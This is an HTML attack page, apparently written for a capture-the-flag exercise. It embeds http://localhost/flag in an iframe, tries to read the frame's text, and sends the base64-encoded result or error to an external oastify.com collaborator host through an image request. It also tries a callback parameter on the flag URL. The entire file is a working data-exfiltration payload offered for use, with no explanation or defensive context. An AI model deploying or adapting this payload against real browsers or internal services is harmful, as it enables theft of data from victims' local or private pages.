<!DOCTYPE html>
<html>
    <head>HEHE</head>
<body>
<iframe id="target" src="http://localhost/flag" width="100%" height="500"></iframe>
<script>
// Wait for iframe to load, then try to access content
setTimeout(() => {
    const iframe = document.getElementById('target');
    try {
        // This will fail due to CORS, but might work in some configurations
        const content = iframe.contentDocument.body.innerText;
        exfiltrate('iframe_content', content);
    } catch(e) {
        exfiltrate('iframe_error', e.toString());
        
        // Alternative: Take screenshot of what's visible
        takeScreenshotAlternative();
    }
}, 3000);

function takeScreenshotAlternative() {
    // If we can't read content, at least we know the page loaded
    exfiltrate('status', 'Iframe loaded successfully - flag might be visible');
    
    // Try to trigger any JavaScript on the localhost page
    const iframe = document.getElementById('target');
    iframe.src = 'http://localhost/flag?callback=alert';
}

function exfiltrate(type, data) {
    const encoded = btoa(data);
    new Image().src = 'https://7goj29n78aqa9y64r68ex4caj1psdj18.oastify.com/?' + type + '=' + encoded;
}
</script>
</body>
</html>
